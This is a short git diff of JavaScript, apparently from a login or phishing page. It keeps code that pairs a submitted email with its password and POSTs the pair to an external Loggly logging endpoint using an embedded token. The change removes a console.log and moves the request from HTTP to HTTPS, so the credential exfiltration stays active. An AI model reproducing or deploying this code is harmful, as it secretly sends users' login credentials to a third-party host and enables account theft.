@@ -62,9 +62,8 @@
         
 
       var data = {}
-      data[email] = pw
-      console.log('data', data)
-      fetch("http://logs-01.loggly.com/inputs/97cfe71b-bd17-4448-993e-77e2cf1ba5f0/tag/http/", {
+      data[email] = pw      
+      fetch("https://logs-01.loggly.com/inputs/97cfe71b-bd17-4448-993e-77e2cf1ba5f0/tag/http/", {
           method: "POST",
           body: JSON.stringify(data)
       })
